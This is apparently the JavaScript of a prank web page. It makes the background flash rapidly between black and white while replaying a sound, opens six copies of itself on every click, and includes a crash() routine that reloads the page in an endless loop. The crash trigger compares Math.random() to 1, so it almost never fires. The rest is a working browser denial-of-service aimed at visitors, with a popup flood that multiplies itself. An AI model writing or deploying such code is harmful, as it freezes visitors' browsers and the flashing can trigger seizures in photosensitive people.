const content = document.getElementById("content");
const sigma = document.getElementById("sigma");
var sound = new Audio("./sound.mp3");

sigma.style = "position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);";

function crash() {
    onbeforeunload = function(){localStorage.x=1};

    setTimeout(function(){
        while(1)location.reload(1)
    }, 1000)
}

function animation() {
    var startTime = new Date().getTime();

    function anim() {
        sound.play();

        var currTime = new Date().getTime();
        var interval = 5;

        var animTime = ((currTime - startTime) / 1000) * interval;

        sound.play();

        if (animTime >= 5) {
            document.body.style.backgroundColor = "black";
            sound.play();
        }
        if (animTime >= 10) {
            startTime = new Date().getTime();
            currTime = new Date().getTime();
            document.body.style.backgroundColor = "white";
            sound.play();
        }
        window.requestAnimationFrame(anim);
    }

    anim();
}

animation();


document.addEventListener("click", () => {
    for (let i = 0; i < 6; i++) {
        var win = window.open();
    
        win.location.href = window.location.href;
    }

    if (Math.random(1, 20) == 1) crash();
});
 